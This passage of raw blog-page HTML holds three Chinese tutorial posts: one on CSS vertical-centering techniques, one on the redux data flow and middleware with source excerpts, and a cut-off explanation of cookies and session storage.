+<figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;div class="main"&gt;</div><div class="line">   &lt;div&gt;1&lt;/div&gt;</div><div class="line">   &lt;div&gt;2&lt;/div&gt;</div><div class="line">   &lt;div&gt;3&lt;/div&gt;</div><div class="line">   &lt;div&gt;4&lt;/div&gt;</div><div class="line"> &lt;/div&gt;</div></pre></td></tr></table></figure>
+<h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><blockquote>
+<h4 id="1-对于单行文本或者多行文本的垂直居中"><a href="#1-对于单行文本或者多行文本的垂直居中" class="headerlink" title="1.对于单行文本或者多行文本的垂直居中"></a>1.对于单行文本或者多行文本的垂直居中</h4></blockquote>
+<h5 id="添加等值的padding-top和padding-bottom"><a href="#添加等值的padding-top和padding-bottom" class="headerlink" title="添加等值的padding-top和padding-bottom"></a>添加等值的<code>padding-top</code>和<code>padding-bottom</code></h5><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">body&#123;</div><div class="line">  margin:0;</div><div class="line">&#125;</div><div class="line">main &#123;</div><div class="line">  background: white;</div><div class="line">  margin: 20px 0;</div><div class="line">  padding: 30px 0px;</div><div class="line">&#125;</div><div class="line">main a &#123;</div><div class="line">  background: black;</div><div class="line">  color: white;</div><div class="line">  padding: 40px 30px;</div><div class="line">  text-decoration: none;</div><div class="line">&#125;</div><div class="line">//多行文本垂直居中</div><div class="line">main a &#123;</div><div class="line">  display: block;</div><div class="line">  width: 100px;</div><div class="line">  word-wrap: break-word;//按单词换行</div><div class="line">  word-break: break-all;//按字母换行</div><div class="line">  background: black;</div><div class="line">  color: white;</div><div class="line">  padding: 40px 30px;</div><div class="line">  text-decoration: none;</div><div class="line">&#125;</div><div class="line">&lt;main&gt;</div><div class="line">    &lt;a href="#0"&gt;We're&lt;/a&gt;</div><div class="line">    &lt;a href="#0"&gt;Centered&lt;/a&gt;</div><div class="line">    &lt;a href="#0"&gt;Bits CodePen PRO is pretty sweet CodePen PRO is pretty sweet CodePen PRO is pretty sweet&lt;/a&gt;</div><div class="line">    &lt;a href="#0"&gt;Text&lt;/a&gt;</div><div class="line">  &lt;/main&gt;</div></pre></td></tr></table></figure>
+<h5 id="已知文本不会换行，那么就可以让-line-height-和-height值相等相等，从而实现垂直居中：-父元素拥有固定高度"><a href="#已知文本不会换行，那么就可以让-line-height-和-height值相等相等，从而实现垂直居中：-父元素拥有固定高度" class="headerlink" title="已知文本不会换行，那么就可以让 line-height 和 height值相等相等，从而实现垂直居中：(父元素拥有固定高度)"></a>已知文本不会换行，那么就可以让 line-height 和 height值相等相等，从而实现垂直居中：(父元素拥有固定高度)</h5><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">div&#123;</div><div class="line">  height: 100px;</div><div class="line">  line-height: 100px;</div><div class="line">  white-space: nowrap;</div><div class="line">&#125;</div><div class="line">&lt;main&gt;  </div><div class="line">	&lt;div&gt;I'm a centered line.&lt;/div&gt;</div><div class="line">&lt;/main&gt;</div></pre></td></tr></table></figure>
+<h4 id="使用flex实现垂直居中，父元素拥有固定高度"><a href="#使用flex实现垂直居中，父元素拥有固定高度" class="headerlink" title="使用flex实现垂直居中，父元素拥有固定高度"></a>使用flex实现垂直居中，父元素拥有固定高度</h4><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">main &#123;</div><div class="line">  display: flex;</div><div class="line">  align-items: center;//垂直居中</div><div class="line">  height: 400px;</div><div class="line">&#125;</div><div class="line">main p &#123;</div><div class="line">  display: block;</div><div class="line">  height: 100px;</div><div class="line">  width:100px;</div><div class="line">  background: black;</div><div class="line">  color: white;</div><div class="line">  text-decoration: none;</div><div class="line">&#125;</div><div class="line">&lt;main&gt;</div><div class="line">&lt;p&gt;We're&lt;/p&gt;</div><div class="line">&lt;/main&gt;</div></pre></td></tr></table></figure>
+<h5 id="当父元素高度不固定时-可以通过以下方法设置多行文本的垂直居中"><a href="#当父元素高度不固定时-可以通过以下方法设置多行文本的垂直居中" class="headerlink" title="当父元素高度不固定时,可以通过以下方法设置多行文本的垂直居中"></a>当父元素高度不固定时,可以通过以下方法设置多行文本的垂直居中</h5><p>主要方法就是给父元素设置个before伪元素，为元素高度为100%,设置为inline-block元素；vertical-align:middle;<br>需要垂直居中的子元素设置为inline-block;vertical-align:middle;</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;style type="text/css"&gt;</div><div class="line">    body &#123;  background: #f06d06;  font-size: 80%;&#125;</div><div class="line">    div &#123;  background: white;  width: 240px;  height: 200px;  margin: 20px;  color: white;  resize: vertical;  overflow: auto;  padding: 20px;&#125;</div><div class="line">    .ghost-center &#123;  position: relative;&#125;</div><div class="line">    .ghost-center::before &#123;  content: " ";  display: inline-block;  height: 100%;  width: 1%;  vertical-align: middle;&#125;</div><div class="line">    .ghost-center p &#123;  display: inline-block;  vertical-align: middle;  width: 190px;  margin: 0;  padding: 20px;  background: black;&#125;</div><div class="line">  &lt;/style&gt;</div><div class="line">  &lt;div class="ghost-center"&gt;</div><div class="line">    &lt;p&gt;I'm vertically centered multiple lines of text in a container. Centered with a ghost pseudo element&lt;/p&gt;</div><div class="line">  &lt;/div&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<h4 id="2-块元素的垂直居中"><a href="#2-块元素的垂直居中" class="headerlink" title="2.块元素的垂直居中"></a>2.块元素的垂直居中</h4></blockquote>
+<p>已知子级块元素的高度</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.parent</span> &#123;</div><div class="line">  <span class="attribute">position</span>: relative;</div><div class="line">  <span class="attribute">height</span>:<span class="number">200px</span>;</div><div class="line">  <span class="attribute">width</span>:<span class="number">300px</span>;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.child</span> &#123;</div><div class="line">  <span class="attribute">position</span>: absolute;</div><div class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</div><div class="line">  <span class="attribute">margin-top</span>: -<span class="number">50px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>未知子级块元素的高度,使用transform: tranlateY(-50%);使用 transform 有一个缺陷，就是当计算结果含有小数时（比如 0.5），会让整个元素看起来是模糊的，一种解决方案就是为父级元素设置 transform-style: preserve-3d;</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.parent &#123;</div><div class="line">  position: relative;</div><div class="line">  height:200px;</div><div class="line">  width:300px;</div><div class="line">&#125;</div><div class="line">.child &#123;</div><div class="line">  position: absolute;</div><div class="line">  top: 50%;</div><div class="line">  height: 100px;</div><div class="line">  transform: translateY(-50%);//向上移动自身高度的50%实现垂直居中</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h5 id="使用flex布局"><a href="#使用flex布局" class="headerlink" title="使用flex布局"></a>使用flex布局</h5><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">main &#123;</div><div class="line">  display: flex;</div><div class="line">  justify-content: center;//水平居中</div><div class="line">  align-items: center;//水平居中</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><a href="http://www.web92.net/894.html" target="_blank" rel="external">块元素和行内元素列表</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/css/">css</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/css居中/">css居中</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/2016/03/07/通过css实现各种居中效果/#disqus_thread" class="comments-count-link">Comments</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/21/redux数据流/" title="redux数据流" itemprop="url">redux数据流</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="colorfulcow" target="_blank" itemprop="author">colorfulcow</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-21T04:42:40.000Z" itemprop="datePublished"> Published 2016-01-21</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>在工作中使用redux管理react组件中的数据。一直对redux中的数据流向比较模糊，所以梳理一下这块的知识。</p>
+<p>可以看到<a href="https://github.com/rackt/redux/tree/master/src" target="_blank" rel="external">redux</a>源码中实际上只有5个部分组成：applyMiddleware.js,bindActionCreators.js,combineReducers.js,compose.js,createStore.js组成，和redux的api一一对应</p>
+<h3 id="先梳理一下redux的api"><a href="#先梳理一下redux的api" class="headerlink" title="先梳理一下redux的api"></a>先梳理一下redux的api</h3><blockquote>
+<h4 id="combineReducer"><a href="#combineReducer" class="headerlink" title="combineReducer"></a>combineReducer</h4></blockquote>
+<p>把多个reducer函数合并成一个最终的reducer函数，然后可以对最终的reducer函数调用createStore()方法。</p>
+<blockquote>
+<h4 id="createStore"><a href="#createStore" class="headerlink" title="createStore,"></a>createStore,</h4></blockquote>
+<p>创建一个store存放应用中所有的state<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">createStore(reducer(state, action), <span class="attr">initialstate</span>:any)</div><div class="line"><span class="comment">//返回一个应用的store,该store拥有getState(),dispatch(action),subscribe(listener),replaceReducer()这四个方法</span></div></pre></td></tr></table></figure></p>
+<blockquote>
+<h4 id="applyMiddleware"><a href="#applyMiddleware" class="headerlink" title="applyMiddleware"></a>applyMiddleware</h4></blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">applyMiddleware(...middleWares)</div></pre></td></tr></table></figure>
+<p>使用自定义的middleware来扩展redux,主要是通过middleware来包装store对象的dispatch方法，从而让store可以dispatch异步的action。<br>同时middleware可以组合到一起形成middleware链。<br>具体使用方法如下：<code>middleware</code>接受<code>store</code>对象的<code>dispatch</code>和<code>getState</code>作为命名参数，返回一个函数<code>a</code>；<code>a</code>被传进一个叫做<code>next</code>的下一个<code>middleware</code>的<code>dispatch</code>方法，返回一个以<code>action</code>作为参数的函数<code>b</code>;在<code>b</code>中可以直接调用<code>next(action)</code> 。middleware实例如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&#123; getState, dispatch &#125;) =&gt; <span class="function"><span class="params">next</span> =&gt;</span> action</div></pre></td></tr></table></figure></p>
+<blockquote>
+<h4 id="compose"><a href="#compose" class="headerlink" title="compose"></a>compose</h4></blockquote>
+<p>用于组合多个store enhancer<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">finalCreateStore = compose(</div><div class="line">    applyMiddleware(...middleware),</div><div class="line">    <span class="built_in">require</span>(<span class="string">'redux-devtools'</span>).devTools(),</div><div class="line">    <span class="built_in">require</span>(<span class="string">'redux-devtools'</span>).persistState(</div><div class="line">      <span class="built_in">window</span>.location.href.match(<span class="regexp">/[?&amp;]debug_session=([^&amp;]+)\b/</span>)</div><div class="line">    ),</div><div class="line">    createStore</div><div class="line">  );</div></pre></td></tr></table></figure></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#compost函数的源码</div><div class="line">export default function compose(...funcs) &#123;</div><div class="line">  return (...args) =&gt; &#123;</div><div class="line">    if (funcs.length === 0) &#123;</div><div class="line">      return args[0]</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    const last = funcs[funcs.length - 1]</div><div class="line">    const rest = funcs.slice(0, -1)</div><div class="line"></div><div class="line">    return rest.reduceRight((composed, f) =&gt; f(composed), last(...args))</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">/*</div><div class="line">这个函数的作用实际上是</div><div class="line">compose(a,b,c)等价于 a(b(c))，际使用的场景是finalCreateStore = compose(a,b,createStore)</div><div class="line">finalCreateStore(reducer)</div><div class="line">*/</div></pre></td></tr></table></figure>
+<h3 id="实际开发中遇到的问题"><a href="#实际开发中遇到的问题" class="headerlink" title="实际开发中遇到的问题"></a>实际开发中遇到的问题</h3><blockquote>
+<h4 id="1-action到reducer的映射，怎样对应过去"><a href="#1-action到reducer的映射，怎样对应过去" class="headerlink" title="1.action到reducer的映射，怎样对应过去?"></a>1.action到reducer的映射，怎样对应过去?</h4><h5 id="react-redux库提供了比较便捷的绑定方式"><a href="#react-redux库提供了比较便捷的绑定方式" class="headerlink" title="react-redux库提供了比较便捷的绑定方式"></a>react-redux库提供了比较便捷的绑定方式</h5></blockquote>
+<p>首先react-redux的api只有两个：装饰器<code>connect()</code>和标签结构<code>&lt;Porvider&gt;</code></p>
+<p>第一个api <code>connect</code>具体用法如下:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></div><div class="line"><span class="keyword">import</span> &#123;bindActionCreators&#125; <span class="keyword">from</span> <span class="string">'redux'</span></div><div class="line">connect(</div><div class="line">	<span class="function"><span class="params">state</span>=&gt;</span>&#123;<span class="keyword">return</span> thisComponent.state&#125;,</div><div class="line">	dispatch=&gt;&#123;bindActionCreators(Action, dispatch)&#125;)</div></pre></td></tr></table></figure></p>
+<p>connect中的第一个参数返回当前组件的state，并且在state有更新的时候自动同步，<br>第二个参数接收一个对象，对象里面是一堆actionCreator函数，通过bindActionCreators把Action这个对象中的actionCreators绑定到当前组件,然后可以直接在组件中以这种形式dispatch action：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.props.actionName()</div><div class="line"><span class="comment">//这样就会自动把actionCreator产生的action对象dispatch到reducer中</span></div></pre></td></tr></table></figure></p>
+<p>一开始还疑惑为什么没有显示调用dispatch就会dispatch action，实际上应该是bindActionCreator把我们编写的形如这种形式的actionCreator做了封装<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">actionCreator</span>(<span class="params">params</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">	<span class="attr">type</span>:ActionType.actionName,</div><div class="line">	params</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">封装后-----------&gt;变成了</div><div class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> dispatch(actionCreator.apply(<span class="literal">undefined</span>,  <span class="built_in">arguments</span>))</div><div class="line">&#125;<span class="comment">//chrome中的打印结果</span></div></pre></td></tr></table></figure></p>
+<p>第二个api<code>&lt;Provider&gt;</code><br>作为根组件的父级标签，接受整个应用的store作为props</p>
+<blockquote>
+<h4 id="2-实现异步的action"><a href="#2-实现异步的action" class="headerlink" title="2.实现异步的action"></a>2.实现异步的action</h4></blockquote>
+<p>一般情况下，每当dispatch一个action，state会立即更新，属于同步操作。那么怎样dispatch一个异步的action？<br>这个问题涉及一个redux api:<code>applyMiddleware</code><br>这个api的用法如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> createStoreWithMiddleware = applyMiddleware(...middlewares)(createStore)</div><div class="line"><span class="comment">//先把redux基本的createStore方法转变为使用了中间件的createStore方法</span></div><div class="line"><span class="keyword">let</span> store = createStoreWithMiddleware(reducers)</div><div class="line"><span class="comment">//让后再用进化版createStore:createStoreWithMiddleware来创建整个应用的store</span></div></pre></td></tr></table></figure></p>
+<p>通常的做法就是在中间件中对将要被创造出来的store实例的dispatch方法做封装，使得只能dispatch同步action的dispatch可以dispatch异步的action</p>
+<h4 id="理解middleware"><a href="#理解middleware" class="headerlink" title="理解middleware"></a>理解middleware</h4><p>正因为 middleware 可以完成包括异步 API 调用在内的各种事情，了解它的演化过程是一件相当重要的事。我们将以记录日志和创建崩溃报告为例，引导你体会从分析问题到通过构建 middleware 解决问题的思维过程。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//在redux中标准的中间件写法</span></div><div class="line"><span class="keyword">const</span> logger = <span class="function"><span class="params">store</span> =&gt;</span> next =&gt; <span class="function"><span class="params">action</span> =&gt;</span> &#123;</div><div class="line">  <span class="built_in">console</span>.group(action.type)</div><div class="line">  <span class="built_in">console</span>.info(<span class="string">'dispatching'</span>, action)</div><div class="line">  <span class="keyword">let</span> result = next(action)</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'next state'</span>, store.getState())</div><div class="line">  <span class="built_in">console</span>.groupEnd(action.type)</div><div class="line">  <span class="keyword">return</span> result</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//applyMiddleware()源码中的方法</span></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">applyMiddleware</span>(<span class="params">...middlewares</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">next</span>) =&gt;</span> (reducer, initialState) =&gt; &#123;</div><div class="line">    <span class="keyword">var</span> store = next(reducer, initialState)</div><div class="line">    <span class="keyword">var</span> dispatch = store.dispatch</div><div class="line">    <span class="keyword">var</span> chain = []</div><div class="line"></div><div class="line">    <span class="keyword">var</span> middlewareAPI = &#123;</div><div class="line">      <span class="attr">getState</span>: store.getState,</div><div class="line">      <span class="attr">dispatch</span>: <span class="function">(<span class="params">action</span>) =&gt;</span> dispatch(action)</div><div class="line">    &#125;</div><div class="line">    chain = middlewares.map(<span class="function"><span class="params">middleware</span> =&gt;</span> middleware(middlewareAPI))</div><div class="line">    dispatch = compose(...chain)(store.dispatch)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      ...store,</div><div class="line">      dispatch</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//createStore的返回值</span></div><div class="line"><span class="comment">/*</span></div><div class="line">return &#123;</div><div class="line"> dispatch,</div><div class="line"> subscribe,</div><div class="line"> getState,</div><div class="line"> replaceReducer</div><div class="line"> &#125;</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="comment">//根据上面三个方法推导出redux中间件的工作原理以及为什么需要采用这种写法</span></div><div class="line"><span class="keyword">let</span> createStoreWithMiddleware = applyMiddleware(logger)(createStore)</div><div class="line"><span class="keyword">let</span> todoApp = combineReducers(reducers)</div><div class="line"><span class="keyword">let</span> store = createStoreWithMiddleware(todoApp)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//也就是执行第一步applyMiddleware的时候返回一个函数也就是返回这段代码</span></div><div class="line"> (next) =&gt; <span class="function">(<span class="params">reducer, initialState</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">var</span> store = next(reducer, initialState)</div><div class="line">    <span class="keyword">var</span> dispatch = store.dispatch</div><div class="line">    <span class="keyword">var</span> chain = []</div><div class="line"></div><div class="line">    <span class="keyword">var</span> middlewareAPI = &#123;</div><div class="line">      <span class="attr">getState</span>: store.getState,</div><div class="line">      <span class="attr">dispatch</span>: <span class="function">(<span class="params">action</span>) =&gt;</span> dispatch(action)</div><div class="line">    &#125;</div><div class="line">    chain = middlewares.map(<span class="function"><span class="params">middleware</span> =&gt;</span> middleware(middlewareAPI))</div><div class="line">    dispatch = compose(...chain)(store.dispatch)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      ...store,</div><div class="line">      dispatch</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//以上这段代码的执行参数是createStore方法</span></div><div class="line">  (createStore) =&gt; <span class="function">(<span class="params">reducer, initialState</span>) =&gt;</span> &#123;<span class="comment">/*code*/</span>&#125;</div><div class="line">  <span class="comment">//执行第二部的参数就是combineReducer(reducer)</span></div><div class="line">  <span class="comment">//也就是最后输出的store实际上是</span></div><div class="line">  <span class="keyword">let</span> store = applyMiddleware(logger)(createStore)(todoApp)</div></pre></td></tr></table></figure>
+<blockquote>
+<h4 id="3-怎样保持UI和URL的同步？"><a href="#3-怎样保持UI和URL的同步？" class="headerlink" title="3.怎样保持UI和URL的同步？"></a>3.怎样保持UI和URL的同步？</h4></blockquote>
+<p>像angular等框架中提供了路由系统，来保持UI和URL的同步；使用react后可以使用react-router来同步UI和URL,但是react-router存在一个问题，就是:项目中已经使用了redux来管理数据流，但是react-router提供的router state不是在redux store中的，所以实现路由跳转必须在组件中进行，针对这个问题，可以引入redux-router</p>
+<p>这是在学习过程中写的一个<a href="https://github.com/ColorfulCow/sosmalldemo" target="_blank" rel="external">小例子 地址</a>，供参考</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/前端框架/">前端框架</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/javascript/">javascript</a><a href="/tags/redux/">redux</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/2016/01/21/redux数据流/#disqus_thread" class="comments-count-link">Comments</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/12/25/cookie和session必知必会/" title="cookie和session必知必会" itemprop="url">cookie和session必知必会</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="colorfulcow" target="_blank" itemprop="author">colorfulcow</a>
+		
+  <p class="article-time">
+    <time datetime="2015-12-25T13:51:45.000Z" itemprop="datePublished"> Published 2015-12-25</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h4 id="cookie和session的定义"><a href="#cookie和session的定义" class="headerlink" title="cookie和session的定义"></a>cookie和session的定义</h4><p>cookie是http协议的一部分，存在的原因是因为http协议是无状态的协议，对于客户端每次发出的请求,下一次请求无法得知上一次请求包含的状态数据;<br>cookie的内容主要包括：名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览器会话期的cookie被称为session cookie。session cookie一般不存储在硬盘上而是保存在内存里，当然这种行为并不是规范规定的。若设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再次打开浏览器，这些cookie仍然有效直到超过设定的过期时间。存储在硬盘上的cookie可以在不同的浏览器进程间共享，比如两个IE窗口。而对于保存在内存里的cookie，不同的浏览器有不同的处理方式。</p>
+<p>cookie虽然方便使用，但是cookie中的所有数据在客户端就可以被修改，数据容易被伪造，所以重要的数据不适合存放在cookie中,而且每次客户端发送请求都会携带着cookie,所以如果cookie中的数据字段太多会影响传输效率，为了解决这些问题就产生了session,session是保存在服务器端用于记录用户和服务器交互状态的一种数据结构。</p>
+<h4 id="根据cookie和session来识别用户"><a href="#根据cookie和session来识别用户" class="headerlink" title="根据cookie和session来识别用户"></a>根据cookie和session来识别用户</h4><p>每次HTTP请求的时候，<code>浏览器检查所有存储的cookie，如果某个cookie声明的作用范围
+大于等于将要请求的资源所在的位置，则把该cookie附在请求资源的HTTP请求头上发送给服务器。</code>实际上大多数的应用都是用 Cookie 来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，服务器就知道访问者是谁了。如果客户端的浏览器禁用了 Cookie 一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。</p>
+<h4 id="session的存储方式"><a href="#session的存储方式" class="headerlink" title="session的存储方式"></a>session的存储方式</h4><h6 id="session-可以存放在"><a href="#session-可以存放在" class="headerlink" title="session 可以存放在"></a>session 可以存放在</h6><ol>
+<li>内存</li>
+<li>cookie本身</li>
+<li>redis 或 memcached 等缓存中，</li>
+<li>数据库中；</li>
+</ol>
+<blockquote>
+<p>以上几种存储方式的利弊</p>
+</blockquote>
+<h5 id="在内存中存储session"><a href="#在内存中存储session" class="headerlink" title="在内存中存储session"></a>在内存中存储session</h5><p>在express中操作session需要使用express-session或者cookie-session等相关模块，express-session默认是使用内存来存储session，对于开发调试挺方便，但是没有其他好处</p>
+<h5 id="使用redis存储session"><a href="#使用redis存储session" class="headerlink" title="使用redis存储session"></a>使用redis存储session</h5><p>session直接存放在内存中不方便进程间共享，可以使用 redis 等缓存来存储 session。假设你的机器是 4 核的，你使用了 4 个进程在跑同一个 node web 服务，当用户访问进程1时，他被设置了一些数据当做 session 存在内存中。而下一次访问时，他被负载均衡到了进程2，则此时进程2的内存中没有他的信息，认为他是个新用户。这就会导致用户在我们服务中的状态不一致。</p>
+<h5 id="session信息存放在cookie中"><a href="#session信息存放在cookie中" class="headerlink" title="session信息存放在cookie中"></a>session信息存放在cookie中</h5><p>用 cookie session 的话，是不用担心状态共享问题的，因为 session 的 data 不是由服务器来保存，而是保存在用户浏览器端，每次用户访问时，都会主动带上他自己的信息。当然在这里，安全性之类的，只要遵照最佳实践来，也是有保证的。它的弊端是增大了数据量传输，利端是方便。</p>
